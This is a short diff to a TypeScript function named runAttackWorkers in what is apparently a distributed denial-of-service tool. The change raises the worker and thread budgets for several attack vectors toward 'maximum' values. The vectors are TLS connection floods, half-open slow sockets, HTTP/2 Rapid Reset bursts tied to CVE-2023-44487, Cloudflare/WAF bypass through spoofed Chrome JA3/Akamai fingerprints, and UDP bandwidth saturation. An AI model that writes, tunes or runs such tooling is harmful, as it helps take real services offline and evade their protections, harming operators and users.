@@ -193,17 +193,17 @@ async function runAttackWorkers(
     const h2W   = Math.max(2, Math.ceil(CPU_COUNT * 0.30)); // ≥2 workers — H2 resilience vs CF
     const wafW  = Math.max(2, Math.ceil(CPU_COUNT * 0.20)); // ≥2 workers — WAF bypass resilience
 
-    // Thread budget per vector (scales with user threads input)
-    // conn: max(50, t×0.20)  → MAX_CONN = min(t×60, 15000) TLS sockets
-    // slow: max(40, t×0.15)  → MAX_CONN = min(t×80, 20000) half-open sockets
-    // h2:   max(100, t×0.35) → 40 sessions/worker × 64-stream RST burst = CVE-2023-44487
-    // waf:  max(80, t×0.25)  → 80 sessions/worker × Chrome JA3/AKAMAI fingerprint bypass
-    // udp:  max(8, t×0.05)   → bandwidth saturation at L4
+    // Thread budget per vector — 8vCPU/32GB optimized
+    // conn: max(50, t×0.20)  → MAX_CONN = min(t×60, 15000) TLS sockets → up to 12K conns at t=200
+    // slow: max(40, t×0.15)  → MAX_CONN = min(t×80, 20000) half-open   → up to 12K conns at t=150
+    // h2:   max(120, t×0.40) → 200 sessions/worker × 256-stream RST burst = CVE-2023-44487 MAXIMUM
+    // waf:  max(100, t×0.30) → 400 sessions/worker × 128-stream Chrome JA3/AKAMAI bypass
+    // udp:  max(32, t×0.08)  → 32 sockets × 400 inflight datagrams = maximum L4 saturation
     const connT = Math.max(50,  Math.round(threads * 0.20));
     const slowT = Math.max(40,  Math.round(threads * 0.15));
-    const h2T   = Math.max(100, Math.round(threads * 0.35)); // dominant CVE vector
-    const wafT  = Math.max(80,  Math.round(threads * 0.25)); // dominant CF bypass
-    const udpT  = Math.max(8,   Math.round(threads * 0.05));
+    const h2T   = Math.max(120, Math.round(threads * 0.40)); // ★ dominant CVE vector — maximum sessions
+    const wafT  = Math.max(100, Math.round(threads * 0.30)); // ★ CF bypass — maximum fingerprinted sessions
+    const udpT  = Math.max(32,  Math.round(threads * 0.08)); // 32 sockets on 8vCPU deployment
 
     // Track conns from conn+slow pools, sum and forward
     const geassConnsPerPool = new Map<string, number>();
